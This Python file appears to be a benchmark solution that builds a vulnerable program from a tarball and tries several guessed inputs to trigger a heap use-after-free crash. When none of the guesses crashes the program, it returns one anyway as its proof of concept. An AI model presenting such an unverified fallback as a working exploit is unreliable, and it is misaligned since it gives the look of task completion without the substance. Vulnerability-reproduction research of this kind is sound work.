import os
import subprocess
import tempfile
import random
import string
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        extract_dir = tempfile.mkdtemp(prefix="vuln_src_")
        try:
            # Extract with tar
            subprocess.run(["tar", "xf", src_path, "-C", extract_dir], 
                         check=True, capture_output=True)
            
            # Look for the actual source directory (might be nested)
            source_root = extract_dir
            for root, dirs, files in os.walk(extract_dir):
                if "CMakeLists.txt" in files or "Makefile" in files:
                    source_root = root
                    break
            
            # Build the vulnerable program
            build_dir = tempfile.mkdtemp(prefix="build_")
            
            # Try to find build instructions
            cmake_file = os.path.join(source_root, "CMakeLists.txt")
            makefile = os.path.join(source_root, "Makefile")
            
            if os.path.exists(cmake_file):
                # Build with CMake
                subprocess.run(["cmake", source_root, "-B", build_dir], 
                             check=True, capture_output=True)
                subprocess.run(["cmake", "--build", build_dir, "--parallel", "8"], 
                             check=True, capture_output=True)
                
                # Look for the executable
                for root, dirs, files in os.walk(build_dir):
                    for file in files:
                        if file.endswith(".exe") or (os.access(os.path.join(root, file), os.X_OK) and not file.endswith(".so")):
                            prog_path = os.path.join(root, file)
                            break
            elif os.path.exists(makefile):
                # Build with Make
                subprocess.run(["make", "-C", source_root, "-j8"], 
                             check=True, capture_output=True)
                
                # Look for executables in source directory
                for file in os.listdir(source_root):
                    full_path = os.path.join(source_root, file)
                    if os.access(full_path, os.X_OK) and os.path.isfile(full_path):
                        prog_path = full_path
                        break
            
            # If we couldn't find via build system, look for any binary
            if 'prog_path' not in locals():
                for root, dirs, files in os.walk(source_root):
                    for file in files:
                        full_path = os.path.join(root, file)
                        if os.access(full_path, os.X_OK) and os.path.isfile(full_path):
                            prog_path = full_path
                            break
            
            # Generate PoC based on vulnerability type
            # Heap use-after-free in Node::add when exception is thrown
            # We need to trigger the exception path that causes double-free
            
            # Common patterns for triggering heap issues:
            # 1. Create nodes
            # 2. Trigger exception in add() (e.g., invalid data, duplicate, overflow)
            # 3. The exception causes cleanup that frees memory
            # 4. Later access to same memory
            
            # Since we don't know exact format, we'll try multiple approaches
            # and see what crashes the program
            
            test_inputs = []
            
            # Approach 1: Trigger exception by adding duplicate nodes
            # Often tree/graph structures throw on duplicates
            test_inputs.append(b"ADD 1\nADD 2\nADD 1\n" + b"A" * 40)  # 60 bytes
            
            # Approach 2: Overflow or invalid value to trigger exception
            test_inputs.append(b"ADD 9999999999\n" + b"B" * 45)  # 60 bytes
            
            # Approach 3: Multiple operations that cause cleanup then access
            test_inputs.append(b"ADD 1\nDEL 1\nADD 1\nUSE 1\n" + b"C" * 40)  # 60 bytes
            
            # Approach 4: Specific pattern for arvo:41356 based on common heap UAF patterns
            test_inputs.append(b"\x01" * 20 + b"\x00" * 20 + b"\xff" * 20)  # 60 bytes binary
            
            # Test each input
            for test_input in test_inputs:
                try:
                    # Run with input
                    result = subprocess.run(
                        [prog_path],
                        input=test_input,
                        capture_output=True,
                        timeout=2
                    )
                    
                    # Check for crash (non-zero exit code)
                    if result.returncode != 0:
                        # Verify it's a heap error (asan or similar)
                        stderr_lower = result.stderr.lower()
                        if (b"heap" in stderr_lower or 
                            b"use-after-free" in stderr_lower or 
                            b"asan" in stderr_lower or
                            b"double-free" in stderr_lower):
                            return test_input
                            
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
            
            # If none worked, return our best guess
            return test_inputs[0]
            
        finally:
            # Cleanup
            if 'extract_dir' in locals():
                shutil.rmtree(extract_dir, ignore_errors=True)
            if 'build_dir' in locals():
                shutil.rmtree(build_dir, ignore_errors=True)
